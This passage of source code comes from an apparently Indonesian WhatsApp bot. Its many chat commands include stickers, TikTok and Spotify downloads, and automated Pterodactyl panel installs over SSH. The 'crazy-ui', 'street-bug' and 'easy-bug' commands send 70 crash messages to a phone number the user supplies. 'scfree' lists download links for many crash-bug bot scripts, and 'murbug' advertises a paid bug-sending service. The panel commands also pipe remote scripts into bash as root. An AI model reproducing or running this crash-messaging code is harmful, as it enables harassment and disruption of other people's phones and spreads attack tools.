`*${_meta.participants.length}* Total Members\n*${_meta.participants.filter(x => x.admin === 'admin').length}* Admin\n*${_meta.participants.filter(x => x.admin === null).length}* Not Admin\n\n` +
`Group ID : ${_meta.id}`
await client.sendMessage(m.chat,{
caption,
image: await getBuffer(_img)
},
{ quoted: m }
)
}
break





case 'intro': {
if (!isGroup) return reply(`Khusus grup`)
let teks = '*_KARTU INTRO_*\n╭───❑\n│Nama lengkap:\n│Nama panggilan:\n│Askot:\n│Umur:\n│Kelas:\n│Hobi:\n│Game favorit:\n╰──❑'
reply(teks)
}
break
case 'afk':
if (!isGroup) return reply(`Only Group`)
let reason = text ? text : 'Nothing.';
reply(`@${m.sender.split('@')[0]} Sedang AFK\nDengan Alasan : ${reason}`);
break

case 'crazy-ui': case 'street-bug': case 'easy-bug': {
if (!isOwner) return reply("*KHUSUS OWNER*")
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗦𝗘𝗡𝗗𝗘𝗥 𝗕𝗨𝗚 𝗖𝗥𝗔𝗦𝗛")
for (let i = 0; i < 70; i++) {
await XeonButtNew(target, ptcp = true)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
}
break
case "scfree": case "freesc": 
return reply(`https://www.mediafire.com/file/pyaais6k8rx8kio/𝐎𝐁𝐄𝐓𝐙+𝐅𝐎𝐑𝐄𝐕𝐄𝐑+𝐁𝐔𝐆+𝐌𝐎𝐃𝐄+𝐍𝐓.zip/file

LaxxyMods V2.0
https://www.mediafire.com/file/3vi7sdl30y07ca3/𝙻𝚊𝚡𝚡𝚢𝙼𝚘𝚍𝚜+𝟸.𝟶©.zip/file

Dynz Bug Hard V6
https://www.mediafire.com/file/lp6feohmfa3f9v9/𝙳𝚈𝙽𝚉+𝙱𝚄𝙶+𝙷𝙰𝚁𝙳+𝚅𝙴𝚁𝚂𝙸𝙾𝙽+6+𝙴𝙽𝙲.zip/file

HadzCrashV4
https://www.mediafire.com/file/6dveplp6c6f98qv/HADZZCRASH+V4.zip/file

BugDanz Ofc V2
https://www.mediafire.com/file/lu0vdo32vwk48bg/PROJEK_SC_BUG_V2_DANZ_OFFICIAL-1.zip/file

DELTA V5.2 NEW
https://www.mediafire.com/file/nc0u0cu5061tmbc/DELTA_5.2_TERBARU_%2528deltaxonevirus%2529.zip/file

LAXXY MODS V 3.0
https://www.mediafire.com/file/87jhylhc79gn8qh/ʟǟӼӼʏʍօɖֆ3.0.zip/file

CPANEL & JAGA GROUP
https://www.mediafire.com/file/293mcdf9b6h26b2/SC_PUSH_X_JAGA_GC_X_CPANEL_BY_THOMZ.zip/file


CPANEL BUTTON 1 SRV
https://www.mediafire.com/file/f6bojn7iqqz40qk/Cpanel_Button_1_Srv.zip/file

CPANEL NO BUTTON SRV 2
https://www.mediafire.com/file/4r9zm51gec92pbi/Cpanel_No_Button_2_Srv.zip/file

CPANEL ANAN OFC
https://www.mediafire.com/file/yecjqqilp9r8c2n/SCRIPT_CPNEL_FREE_ANAN-OFFC.zip/file

APOKASI CPANEL
https://www.mediafire.com/file/gyy3nrduls67lpv/ApoksiCpanel.zip/file

SC BOT BUG RXHL V6
https://www.mediafire.com/file/ui3691sd18yko64/rxhl_v6_no_enc_%2528SFILE.MOBI%2529.zip/file

ONEXZHN
https://www.mediafire.com/file/enjpu7r5b25jreh/onexzhn++(SFILE.MOBI).zip/file

RIO XDZZ V1
https://www.mediafire.com/file/pqpfszy7h9v1gem/RIOO+XDZZ+V1+(SFILE.MOBI).zip/file

SC BOT BUG AIKA V1.1
https://www.mediafire.com/file/8o484o4kbg7dukw/Script+Bug+Aika+1.1++prefix+(SFILE.MOBI).zip/file

XEON V15
https://www.mediafire.com/file/000xfi1g70ag5s2/xeon_v15.zip/file

QIO V15
https://www.mediafire.com/file/000xfi1g70ag5s2/xeon_v15.zip/file

NOLAN V4
https://www.mediafire.com/file/p9ebgyo13wg8s02/v4-NP.zip/file

DYNZ HARD V6
https://www.mediafire.com/file/lp6feohmfa3f9v9/𝙳𝚈𝙽𝚉+𝙱𝚄𝙶+𝙷𝙰𝚁𝙳+𝚅𝙴𝚁𝚂𝙸𝙾𝙽+6+𝙴𝙽𝙲.zip/file

AIKA V1.1
https://www.mediafire.com/file/0xp11tcvwl9c9vp/[!]SC+Aika+1.1.zip/file

XBUG V14
https://www.mediafire.com/file/4b66tnprgv06al3/Xbug+v14.zip/file

ZXV V5
https://www.mediafire.com/file/2wdrh80ok7wcmo0/ZxV+v5.zip/file

𝐓𝐇𝐄 𝐈',𝐌 𝐆𝐎𝐎𝐃 𝐆𝐀𝐌𝐄 
https://www.mediafire.com/file/8ujsgrb6guhk2w1/𝐓𝐇𝐄+𝐈',𝐌+𝐆𝐎𝐎𝐃+𝐆𝐀𝐌𝐄+.zip/file

SC RXHL V10
https://www.mediafire.com/file/ykuogqqyu5vtr10/RxhL+V10+VIP.zip/file
KEY: RXHL

CPANEL +PUSHKONTAK+INSTALL PANEL
https://www.mediafire.com/file/2apy38acvc6sy81/cpanel_%252B_pushkon_%252B_install_panel_%252Bbug.zip/file

CPANEL RAM 25
https://www.mediafire.com/file/21zct8t7bayd5s5/CPANEL_RAM_25.zip/file

CPANEL TELE NO ENC
https://www.mediafire.com/file/4gzduijrukq8egp/cpanel_tele_no_enc.zip/file

SC CREATE PANEL SUPPORT BUTTON
https://www.mediafire.com/file/i3e3mjmror58782/ScCreatePanelSupportButton_.zip/file

CPANEL BUTTON
https://www.mediafire.com/file/lawqdqm32vhqqu4/cpanel_button.zip/file

sᴄ ᴍɪʀᴀ ᴠ1
https://www.mediafire.com/file/9wowldty2r8xcxw/MIRA+V1+ENC.zip/file

sᴄ ʙᴜɢ ᴠ24
https://www.mediafire.com/file/7sbkuqtodgjbdbz/SC+BUG+V2.4+By+WyiiOffc+ENC.zip/file

sᴄ ɴɪɢʜᴛᴍᴀʀᴇ
https://www.mediafire.com/file/nbetik0jdk3qm5q/AAH_NIGHTMARE.zip/file`)
break
case 'installpanel': {
 if (!isOwner) return reply(`Khusus owner blok goblok`)
 let t = text.split(',');
 if (t.length < 5) return reply(`*Format salah!*\nPenggunaan: ${prefix}installpanel ipvps,password,domainpnl,domainnode,ramvps (Contoh 80000 8gb)`);
 let ipvps = t[0];
 let passwd = t[1];
 let subdomain = t[2];
 let domainnode = t[3];
 let ramvps = t[4];
 const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
 };
 let password = `0011`;
 const commandPanel = 'bash <(curl -s https://pterodactyl-installer.se)';
 const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';
 const conn = new Client();

 client.on('ready', () => {
 reply('`PROSES PENGINSTALAN PANEL MOHON DITUNGGU〽️`');
 client.exec(commandPanel, (err, stream) => {
 if (err) throw err;
 stream.on('close', (code, signal) => {
 console.log('Panel installation stream closed with code ' + code + ' and signal ' + signal);
 installWings(conn, domainnode, subdomain, password, ramvps);
 }).on('data', (data) => {
 handlePanelInstallationInput(data, stream, subdomain, password);
 }).stderr.on('data', (data) => {
 console.log('STDERR: ' + data);
 });
 });
 }).connect(connSettings);

 async function installWings(conn, domainnode, subdomain, password, ramvps) {
 reply('`SEDANG MENGINSTAL WINGS TUNGGU YA☣️`');
 client.exec(commandWings, (err, stream) => {
 if (err) throw err;
 stream.on('close', (code, signal) => {
 console.log('Wings installation stream closed with code ' + code + ' and signal ' + signal);
 createNode(conn, domainnode, ramvps, subdomain, password);
 }).on('data', (data) => {
 handleWingsInstallationInput(data, stream, domainnode, subdomain);
 }).stderr.on('data', (data) => {
 console.log('STDERR: ' + data);
 });
 });
 }

 async function createNode(conn, domainnode, ramvps, subdomain, password) {
 const command = `${global.bash}`;
 reply('`MEMULAI CREATE NODE & LOCATION`');

 client.exec(command, (err, stream) => {
 if (err) throw err;
 stream.on('close', (code, signal) => {
 console.log('Node creation stream closed with code ' + code + ' and signal ' + signal);
 client.end();
 sendPanelData(subdomain, password);
 }).on('data', (data) => {
 handleNodeCreationInput(data, stream, domainnode, ramvps);
 }).stderr.on('data', (data) => {
 console.log('STDERR: ' + data);
 });
 });
 }

 function sendPanelData(subdomain, password) {
 reply(`*DATA PANEL ANDA*\n\n*USERNAME:* admin\n*PASSWORD:* ${password}\n*LOGIN:* ${subdomain}\n\nNote: Semua Instalasi Telah Selesai Silahkan Create Allocation Di Node Yang Di buat Oleh Bot Dan Ambil Token Configuration dan ketik .startwings (token) \nNote: *HARAP TUNGGU 1-5MENIT BIAR WEB BISA DI BUKA*`);

 }

 function handlePanelInstallationInput(data, stream, subdomain, password) {
 if (data.toString().includes('Input')) {
 stream.write('0\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('1248\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('Asia/Jakarta\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('admin@gmail.com\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('admin@gmail.com\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('admin\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('adm\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('adm\n');
 }
 if (data.toString().includes('Input')) {
 stream.write(`${password}\n`);
 }
 if (data.toString().includes('Input')) {
 stream.write(`${subdomain}\n`);
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('yes\n');
 }
 if (data.toString().includes('Please read the Terms of Service')) {
 stream.write('A\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('1\n');
 }
 console.log('STDOUT: ' + data);
 }

 function handleWingsInstallationInput(data, stream, domainnode, subdomain) {
 if (data.toString().includes('Input')) {
 stream.write('1\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write(`${subdomain}\n`);
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('user\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('1248\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write(`${domainnode}\n`);
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('admin@gmail.com\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 console.log('STDOUT: ' + data);
 }

 function handleNodeCreationInput(data, stream, domainnode, ramvps) {
 stream.write(`${global.tokeninstall}\n`);
 stream.write('4\n');
 stream.write('SGP\n');
 stream.write('DONE\n');
 stream.write(`${domainnode}\n`);
 stream.write('NODES\n');
 stream.write(`${ramvps}\n`);
 stream.write(`${ramvps}\n`);
 stream.write('1\n');
 console.log('STDOUT: ' + data);
 }
}

break
case 'gett': case 'ttsget': {
if (!text) return reply(`Contoh: ${prefix+command} 1`)
if (!m.quoted) return reply('Reply pesan ttsearch bot!')
let urls = quoted.text.match(new RegExp(/(http(?:s)?:\/\/)?(?:www\.)?(?:tiktok\.com\/@[^\/]+\/video\/(\d+))|(http(?:s)?:\/\/)?vm\.tiktok\.com\/([^\s&]+)|(http(?:s)?:\/\/)?vt\.tiktok\.com\/([^\s&]+)/, 'gi'))
if (!urls) return m.reply(`Mungkin pesan yang kamu reply tidak mengandung hasil ttsearch`)
try{
await client.sendMessage(m.chat, { react: { text: "👌",key: m.key,}})
let anu = await fetchJson(`https://api.vreden.my.id/api/tiktok?url=${urls[text - 1]}`)
let c = 0
for (let imgs of anu.result.data) {
if (imgs.type == "nowatermark") {
client.sendMessage(m.chat, {video: {url: imgs.url }, caption: `© Dikzz`}, {quoted: m})
} else if (imgs.type == "photo") {
if (c == 0) await client.sendMessage(m.chat, { image: { url: imgs.url }, caption: `© Dikzz\n\n${m.isGroup ? 'Sisa foto dikirim di privat chat' : ""}` }, { quoted: m })
else await client.sendMessage(m.sender, {image: {url: imgs.url }}, {quoted: m })
c += 1
await sleep(2000)
}}
} catch(err) {
try{
const data = await tiktokdl(urls[text - 1])
console.log(data)
client.sendMessage(m.chat, { video: { url: data.video}, caption: `© ${wm}`}, {quoted: m})
} catch(err) {
m.reply('Terjadi kesalahan')
}}
}
break

case 'tiktoks': case 'ttsearch2':
case 'tiktoksearch': {
if (!isGroup) return reply(`*KHUSUS DI DALAM GRUP BLOK GOBLOK*`)
if (!text) return m.reply(`Contoh: ${prefix+command} niswahbm tobrut`)
await client.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}})
try{
let serach = await tiktokSearchVideo(text)
let teks = '*TIKTOK - SEARCH*\n\n'
let no = 1
for (let i of serach.videos) {
let sut = await JSON.stringify(i.author)
teks += `• No Urutan: ${no++}\n• Capt: ${i.title}\n• Username: ${i.author.unique_id}\n• Nickname: ${i.author.nickname}\n• Durasi: ${toRupiah(i.duration)} detik\n• Like: ${toRupiah(i.digg_count)}\n• Komentar: ${toRupiah(i.comment_count)}\n• Share: ${toRupiah(i.share_count)}\n• Url: https://www.tiktok.com/@${i.author.unique_id}/video/${i.video_id}\n\n\n*Note:* ingin mendownload? ketik .gett\n\n\n`
}
client.sendMessage(m.chat, { video: { url: `https://tikwm.com${serach.videos[0].play}` }, caption: teks }, { quoted: m })
} catch(err) {
m.reply(`Terjadi kesalahan`);
}}
break

case 'cekkonbrut': case 'cekmemek': case 'cekjembud': case 'cektobrut': case 'tobrutcek': {
if (!isGroup) return reply(`Harus di dalam grup blok goblok`)
if (!text) return m.reply(`Contoh: ${prefix+command} toya`)
const khodam = pickRandom([
"GEDE BANGET😘",
"Sekecil mekdi🤏",
"Lumayan😅",
"Gede banget😱",
"Kecil ga keliatan🫠",
"idaman ambatukam🤩",
])
const response = `*${command}*
> - Nama: ${text}
> - Ukuran: ${khodam}`
m.reply(response)}
break
case 'cekumur': {
if (!isGroup) return reply(`Harus di dalam grup blok goblok`)
if (!text) return m.reply(`Contoh: ${prefix+command} toya`)
const umur = pickRandom([
"100 tahun",
"3 tahun",
"8 tahun",
"20 tahun",
"32 tahun",
"19 tahun",
])
const response = `*${command}*
> - Nama: ${text}
> - Umur: ${umur}`
m.reply(response)}
break


case "autoread": {
if (!isOwner) return reply(mess.only.owner)
if (!text) return m.reply(example("on/off"))
if (text.toLowerCase() == "on") {
if (autoread) return m.reply("*Autoread* Sudah Aktif!")
autoread = true
m.reply("Berhasil Menyalakan *Autoread ✅")
} else if (text.toLowerCase() == "off") {
if (!autoread) return m.reply("*Autoread* Sudah Tidak Aktif!")
autoread = false
m.reply("Berhasil Mematikan *Autoread ❌")
} else {
return m.reply(example("on/off"))
}}
break
case 's':
case 'sticker':
case 'stiker':
 // Cek apakah media dikirim atau direply
 let mime = (m.mess || m).mimetype || '';
 
 // Jika media adalah view once, gambar, atau video
 if (/image/.test(mime) || /video/.test(mime) || isMedia) {
 
 // Batasi durasi video maksimal 10 detik
 
 // Set kualitas berdasarkan tipe media (gambar atau video)
 let kualitas = /image/.test(mime) ? 70 : 2;
 
 // Import wa-sticker-formatter untuk membuat stiker
 let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter');
 
 // Unduh media yang direply atau dikirim
 let media = await client.downloadAndSaveMediaMessage(quoted, makeid(5));
 
 // Buat stiker dari media yang diunduh
 let jancok = new Sticker(media, {
 pack: namabot, // Nama pack
 author: pushname, // Nama pembuat (pengguna yang mengirim)
 type: StickerTypes.FULL, // Jenis stiker (FULL atau CROPPED)
 categories: ['🤩', '🎉'], // Kategori stiker (opsional)
 id: '12345', // ID unik stiker
 quality: kualitas, // Kualitas output file
 background: '#FFFFFF00' // Warna latar belakang (untuk stiker full)
 });
 
 // Simpan stiker dalam format .webp
 let stok = getRandom('.webp');
 let nono = await jancok.toFile(stok);
 let nah = fs.readFileSync(nono);
 
 // Kirim stiker ke chat
 await client.sendMessage(from, { sticker: nah }, { quoted: m });
 
 // Hapus file sementara setelah digunakan
 await fs.unlinkSync(stok);
 await fs.unlinkSync(media);
 
 } else {
 // Jika bukan gambar atau video, beri informasi cara penggunaan
 reply(`Kirim gambar atau video dengan caption ${command} atau balas gambar/video yang sudah dikirim. Note: Maksimal durasi video adalah 10 detik!`);
 }
 break
case 'uninstallpanel': {
 if (!isOwner) return reply2(`*Khusus owner blok goblok*`)
 let t = text.split(',');
 if (t.length < 2) return reply(`*Format salah!*\nPenggunaan: ${prefix}uninstallpanel ipvps,password`);
 let ipvps = t[0].trim();
 let passwd = t[1].trim();
 const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
 };

 const command = 'bash <(curl -s https://pterodactyl-installer.se)';

 const conn = new Client();
 let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi
 client.on('ready', () => {
 reply2('*PROSES UNINSTALL PANEL SEDANG BERLANGSUNG, MOHON TUNGGU 20 DETIK*');
 client.exec(command, (err, stream) => {
 if (err) throw err;
 stream.on('close', (code, signal) => {
 console.log('Stream closed with code ' + code + ' and signal ' + signal);
 client.end();
 }).on('data', (data) => {
 console.log('STDOUT: ' + data);
 if (data.toString().includes('Input')) {
 if (data.toString().includes('6')) {
 stream.write('6\n');
 } else if (data.toString().includes('y/n')) {
 stream.write('y\n');
 } else {
 stream.write('\n');
 }
 }
 }).stderr.on('data', (data) => {
 console.log('STDERR: ' + data);
 });
 });
 }).connect(connSettings);
 await new Promise(resolve => setTimeout(resolve, 20000));
 if (isSuccess) {
 reply('`SUKSES UNINSTALL PANEL ANDA, SILAHKAN CEK`');
 }
 }
 break

case "startwings": case "configurewings": {
if (!isOwner) return reply(mess.only.owner)
let t = text.split('|')
if (t.length < 3) return reply(".startwings ipvps|pwvps|token_node")

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const client = new Client();

client.on('ready', () => {
client.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await reply("*Berhasil menjalankan wings ✅*\n* Status wings : *aktif*")
client.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case 'say': {
if (!isOwner && !isPremium) return reply2(`Khusus premium`)
if (!text) return m.reply(`Contoh: ${prefix+command} aku sayang ayu`)
await client.sendMessage(m.chat, { react: { text: "😘",key: m.key,}})
let anu = await fetchJson(`https://api.erdwpe.com/api/soundoftext?text=${text}&lang=id-ID`)
const aud = anu.result
client.sendMessage(m.chat, {audio : {url : aud}, mimetype:'audio/mpeg', ptt: true}, {quoted:m})
}
break

case 'murbug':
tutor = fs.readFileSync('./image/murbug.jpg')
client.sendMessage(m.chat, {image: tutor, caption: `*OPEN MURBUG VIP BY DIKZZ*
*Price:* 
> Owner: 20.000 (permanen)
> Member: 10.000 (1 bulan)
> Jasbug: 2.000/nomor

*Contact person:*
> Telegram: t.me/dikatoki111
*Testimoni:*
> https://whatsapp.com/channel/0029ValalxrICVfeUyTSrV1O`},{quoted: m})
break

case 'qrispay':
qriss = fs.readFileSync('./image/qris.jpg')
client.sendMessage(m.chat, {image: qriss, caption: `Jangan lupa membawa bukti tf`},{quoted: fkontak})
break

case 'play-spo': case 'playmusik':
 if (!text) return m.reply('mau cari lagu apa?');
 try {
 let spo = await (await fetch('https://endpoint.web.id/search/spotify?key=' + global.key + '&query=' + text)).json();
 if (spo.status && spo.result.length > 0) {
 let randomIndex = Math.floor(Math.random() * spo.result.length);
 let track = spo.result[randomIndex];
 let dls = await (await fetch('https://endpoint.web.id/downloader/spotify?key=' + global.key + '&url=' + track.link)).json();
 let loxx = dls.result;
 
 await client.sendMessage(m.chat, { 
 audio: { 
 url: loxx.download
 }, 
 mimetype: 'audio/mp4', contextInfo: {
 externalAdReply: {
 title: loxx.title,
 body: `Author : ${loxx.artis}`,
 thumbnailUrl: loxx.image,
 mediaType: 1,
 showAdAttribution: false,
 renderLargerThumbnail: true,
 },
 }, 
 }, { quoted: m });
 } else {
 m.reply('No results found.');
 }
 } catch (e) {
 m.reply('rest api sedang erorr');
 }
 break

case "installpanel2": {
if (!isOwner) return reply(mess.owner)
if (!text) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let vii = text.split("|")
if (vii.length < 5) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let sukses = false

const client = new Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
client.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
client.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await client.sendMessage(m.chat, {text: teks}, {quoted: m})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By Kyami\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By Kyami\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
client.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

client.on('ready', async () => {
await m.reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
client.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);
}
brea

case "uninstallpanel2": {
if (!isOwner) return m.reply(mess.owner);
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
var vpsnya = text.split("|")
if (vpsnya.length < 2) return m.reply(example("ipvps|pwvps|domain"))
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const connSettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const client = new Client();
client.on('ready', async () => {

await m.reply("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selsai")

client.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await client.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await m.reply("Berhasil *uninstall* server panel ✅")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
m.reply('Berhasil Uninstall Server Panel ✅');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
m.reply('Katasandi atau IP tidak valid')
}).connect(connSettings)
}
break

case "ssweb": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
const {
 screenshotV1, 
 screenshotV2,
 screenshotV3 
} = require('getscreenshot.js')
const fs = require('fs')
var data = await screenshotV2(text)
await client.sendMessage(m.chat, { image: data, mimetype: "image/png"}, {quoted: m})
}
break
case "help":
case "menu": {
await loading()
let statususer = isOwner ? 'Owner 🎐' : isPremium ? 'Premium 💎' : 'User 🐱';
let teksmenu = `▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

┏━━━━━━⌜ *𝐁𝐎𝐓-𝐈𝐍𝐅𝐎* ⌟━━━━━━
┠✎ *BOTNAME:* ${global.namabot}
┠✎ *RUNTIME:* ${run} 
┠✎ *STATUS:* ${client.public ? `ᴘᴜʙʟɪᴄ` : `sᴇʟғ`}
┠✎ *DATE:* ${hariini}
┠✎ *PLATFORM:* Google Chrome(ubuntu)
┠✎ *PREFIX:* Multi Prefix
┠✎ *VERSION:* 5.0 [ NEW ]
┠✎ *SPEED:*  ${moment.duration(Date.now() - parseInt(m.messageTimestamp.toString()) * 1000).asSeconds()}ms
┗━━━━━━━━━━━━━━━━━━━━━━━━

┏━━━━━━⌜ *𝐔𝐒𝐄𝐑-𝐈𝐍𝐅𝐎* ⌟━━━━━━
┠☞ *NAME:* ${pushname}
┠☞ *NUMBER:* ${m.sender.split('@')[0]}
┠☞ *STATUS:* ${statususer}
┗━━━━━━━━━━━━━━━━━━━━━━━━

╭───《 *ʟɪꜱᴛ ᴍᴇɴᴜ* 》───╮
├ .rules
├ .owner
├ .menu-all
├ .menu-bug
├ .menu-grup
├ .menu-download
├ .menu-ai
├ .menu-random
├ .menu-sound
├ .menu-stalk
├ .menu-panel
├ .menu-dgtl
├ .menu-jadibot
├ .menu-installpanel
├ .menu-owner
